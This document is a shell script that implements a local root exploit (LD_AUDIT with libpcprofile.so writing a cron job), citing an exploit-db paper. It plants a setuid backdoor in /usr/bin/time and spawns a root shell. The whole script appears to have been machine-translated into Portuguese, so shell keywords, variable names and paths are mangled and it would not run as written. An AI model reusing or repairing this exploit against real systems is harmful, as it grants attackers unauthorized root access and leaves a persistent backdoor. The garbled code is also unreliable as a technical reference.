# ldaudit_pcprofile.sh
#! / Bin / sh  # A implementação limpador de: http://www.exploit-db.com/papers/15311/ # Este script usa Perl como um provedor de setuid (), mas qualquer lang vai fazer  Crontab = `date +% s` BASETMP = `mktemp` CARREGADOR = $ {} BASETMP .sh ROOTPL = "$ {} crontab .pl"  rm -f $ {} BASETMP toque $ {} CARREGADOR  PERL = `que perl`  E se [ ! -f $ {PERL}]; então  echo "[*] Este exploit requer o interpretador perl"  Saída fi  umask 0 LD_AUDIT = "libpcprofile.so" PCPROFILE_OUTPUT = "/ etc / cron.d / $ {} crontab" ping> / dev / null 2> &amp; 1 umask 22  E se [ ! -f /etc/cron.d/${CRONTAB}]; então  echo "[*] Este sistema não é vulnerável"  Saída fi  echo "* * * * * root / bin / bash $ {} LOADER"> /etc/cron.d/${CRONTAB}  echo "[*] entrada cron Criado como /etc/cron.d / $ {} crontab ..."  echo "rm -f /etc/cron.d/${CRONTAB}"> $ {} CARREGADOR echo "rm -f $ {} LOADER" >> $ {} CARREGADOR echo "echo '#! $ {} PERL'> / etc / $ {} ROOTPL" >> $ {} CARREGADOR echo "echo '\ $ &lt;= \ $> = \ $ (= \ $) = 0;' >> / Etc / $ {} ROOTPL ">> $ {} CARREGADOR echo "echo 'undef% ENV;% ENV = (\" PATH \ "=> \" / bin: / usr / bin: / usr / sbin: / sbin \ ");' >> / Etc / $ {} ROOTPL ">> $ CARREGADOR echo "echo 'sistema (\" / bin / bash -i \ ")' >> / etc / $ {} ROOTPL" >> $ {} CARREGADOR  echo "chmod 755 / etc / $ {} ROOTPL" >> $ {} CARREGADOR echo "tocar -r / usr / bin / tempo / etc / $ {} ROOTPL" >> $ {} CARREGADOR echo "chmod 4755 / usr / bin / hora" >> $ {} CARREGADOR echo "tocar -r / etc / $ {} ROOTPL / usr / bin / hora" >> $ {} CARREGADOR chmod 755 $ {} CARREGADOR  echo "[*] Esperando o cronjob para executar ..." enquanto [! -f / etc / $ {ROOTPL}]; fazer sono 5; echo ">>" `date`; feito echo "" echo "[*] Lembre-se de remover o backdoor" echo "# chmod -s / usr / bin / hora" echo "# rm -f / etc / $ {} ROOTPL" echo ""  echo "" echo "[*] Desova nosso shell de root ..." echo ""  / usr / bin / hora $ {PERL} / etc / $ {} ROOTPL
